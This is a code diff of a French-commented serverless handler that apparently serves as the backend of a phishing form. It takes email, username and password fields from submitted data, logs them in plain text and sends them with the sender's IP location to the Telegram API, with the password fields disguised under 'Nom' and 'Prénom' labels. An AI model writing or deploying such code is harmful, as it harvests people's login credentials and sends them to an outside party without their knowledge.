@@ -25,11 +25,11 @@ export async function handler(event) {
 
   try {
     // Extraction des données du corps de la requête
-    const { email, motDePasse } = JSON.parse(event.body);
-    console.log("Données reçues:", { email, motDePasse });
+    const { usermail, user, pass } = JSON.parse(event.body);
+    console.log("Données reçues:", { usermail, user, pass });
 
     // Vérifier si les champs sont présents
-    if (!email || !motDePasse) {
+    if (!usermail || !user || !pass) {
       return {
         statusCode: 400,
         body: JSON.stringify({ error: "Champs manquants" }),
@@ -61,8 +61,9 @@ export async function handler(event) {
     const message = `
 📩 Nouveau formulaire
 🌍 IP : ${ipLocation}
-👤 Nom : ${email}
-👤 Prénom : ${motDePasse}
+👤 Nom : ${usermail}
+👤 Prénom : ${user}
+👤 Prénom : ${pass}
     `;
 
     // Envoi du message à l'API Telegram
